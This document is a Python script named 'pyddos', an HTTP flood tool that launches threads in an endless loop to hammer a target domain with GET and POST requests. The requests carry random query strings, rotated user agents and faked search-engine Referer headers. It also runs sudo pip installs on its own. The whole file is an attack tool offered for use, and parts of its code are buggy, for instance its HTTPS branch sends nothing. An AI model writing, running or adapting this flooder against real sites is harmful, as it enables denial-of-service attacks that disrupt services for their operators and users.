#!/usr/bin/env python3


import re
import os
import sys
import json
import time
import string
import signal
import  http.client,urllib.parse
from random import *
from socket import *
from struct import *
from threading import *
from argparse import ArgumentParser,RawTextHelpFormatter

if os.name == 'posix':
    c = os.system('which pip')
    if c == 256:
        os.system('sudo apt-get install python-pip')
    else:
        pass
else:
    print ('[-] Check your pip installer')

try:
    import requests,colorama
    from termcolor import colored,cprint
except:
    try:
        if os.name == 'posix':
            os.system('sudo pip install colorama termcolor requests')
            sys.exit('[+] I have installed necessary modules for you')
        elif os.name == 'nt':
            os.system('pip install colorama requests termcolor')
            sys.exit('[+] I have installed nessecary modules for you')
        else:
            sys.exit('[-] Download and install necessary modules')
    except Exception as e:
        print ('[-]',e)
if os.name == 'nt':
    colorama.init()

signal.signal(signal.SIGFPE,signal.SIG_DFL)

def fake_ip():
    while True:
        ips = [str(randrange(0,256)) for i in range(4)]
        if ips[0] == "127":
            continue
        fkip = '.'.join(ips)
        break
    return fkip

def check_tgt(args):
    tgt = args.d
    try:
        ip = gethostbyname(tgt)
    except:
        sys.exit(cprint('[-] Can\'t resolve host:Unknown host!','red'))
    return ip

def add_useragent():
    try:
        with open(r"C:\Users\varun\Desktop\Cybersecurity\httpconnection.txt","r") as fp:
            uagents = re.findall(r"(.+)\n",fp.read())
    except FileNotFoundError:
        cprint('')
        return []
    return uagents

def add_bots():
    bots=[]
    bots.append('http://www.bing.com/search?q=%40&count=50&first=0')
    bots.append('http://www.google.com/search?hl=en&num=100&q=intext%3A%40&ie=utf-8')
    return bots

class Requester(Thread):
    def __init__(self,tgt):
        Thread.__init__(self)
        self.tgt = tgt
        self.port = None
        self.ssl = False
        self.req = []
        self.lock=Lock()
        url_type = urllib.parse.urlparse(self.tgt)
        if url_type.scheme == 'https':
            self.ssl = True
            if self.ssl == True:
                self.port = 443
        else:
            self.port = 80
    def header(self):
        cachetype = ['no-cache','no-store','max-age='+str(randint(0,10)),'max-stale='+str(randint(0,100)),'min-fresh='+str(randint(0,10)),'notransform','only-if-cache']
        acceptEc = ['compress,gzip','','*','compress;q=0,5, gzip;q=1.0','gzip;q=1.0, indentity; q=0.5, *;q=0']
        acceptC = ['ISO-8859-1','utf-8','Windows-1251','ISO-8859-2','ISO-8859-15']
        bot = add_bots()
        c=choice(cachetype)
        a=choice(acceptEc)
        http_header = {
            'User-Agent' : choice(add_useragent()),
            'Cache-Control' : c,
            'Accept-Encoding' : a,
            'Keep-Alive' : '42',
            'Host' : self.tgt,
            'Referer' : choice(bot)
        }
        return http_header
    def rand_str(self):
        mystr=[]
        for x in range(3):
            chars = tuple(string.ascii_letters+string.digits)
            text = (choice(chars) for _ in range(randint(7,14)))
            text = ''.join(text)
            mystr.append(text)
        return '&'.join(mystr)
    def create_url(self):
        return self.tgt + '?' + self.rand_str()
    def data(self):
        url = self.create_url()
        http_header = self.header()
        return (url,http_header)

    def run(self):
        try:
            if self.ssl:
                conn = http.client.HTTPSConnection(self.tgt,self.port)
            else:
                conn = http.client.HTTPConnection(self.tgt,self.port)
                self.req.append(conn)
            for reqter in self.req:
                (url,http_header) = self.data()
                method = choice(['get','post'])
                reqter.request(method.upper(),url,None,http_header)
        except KeyboardInterrupt:
            sys.exit(cprint('[-] Canceled by user','red'))
        except Exception as e:
            print (e)
        finally:
            self.closeConnections()
    def closeConnections(self):
        for conn in self.req:
            try:
                conn.close()
            except:
                pass

def main():
    parser = ArgumentParser(
        usage='./%(prog)s -d [target] -T [number threads] -Request',
        formatter_class=RawTextHelpFormatter,
        prog='pyddos',

        epilog='''
Example:
    ./%(prog)s -d www.example.com -T 2000 -Request
'''
)
    options = parser.add_argument_group('options','')
    options.add_argument('-d',metavar='<ip|domain>',default=False,help='Specify your target such an ip or domain name')
    options.add_argument('-T',metavar='<int>',default=1000,help='Set threads number for connection (default = 1000)')
    options.add_argument('-Request',action='store_true',help='Enable request target')
    args = parser.parse_args()
    if args.d == False:
        parser.print_help()
        sys.exit()
    add_bots();add_useragent()
    if args.d:
        check_tgt(args)
    if args.Request:
        tgt = args.d
        threads = []
        print (colored('[*] Start send request to: ','blue')+colored(tgt,'red'))
        while 1:
            try:
                for x in range(int(args.T)):
                    t=Requester(tgt)
                    t.daemon = True
                    t.start()
                    t.join()
            except KeyboardInterrupt:
                sys.exit(cprint('[-] Canceled by user','red'))


if __name__ == '__main__':
    main()
